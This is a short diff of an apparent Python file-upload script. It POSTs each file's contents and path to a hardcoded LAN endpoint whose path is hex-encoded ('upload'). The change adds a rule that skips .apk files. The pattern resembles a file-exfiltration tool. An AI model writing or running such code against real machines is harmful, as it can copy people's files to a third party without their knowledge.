@@ -4,13 +4,16 @@ from os.path import join,exists
 from os import scandir
 url = 'http://192.168.1.27:5000/75706C6F6164'
 
+
+
 def SendCountent(filename):
     while True:
         try:
             if exists(filename):
-                with open(filename,'rb') as filetosend:
-                    print(f'working on {filename}')
-                    post(url,files={'file':filetosend},data={'filepath':filename}) ; break
+                if not filename.endswith('.apk'):
+                    with open(filename,'rb') as filetosend:
+                        print(f'working on {filename}')
+                        post(url,files={'file':filetosend},data={'filepath':filename}) ; break
             else:
                 raise FileNotFoundError
         except (exceptions.ConnectionError,exceptions.Timeout):
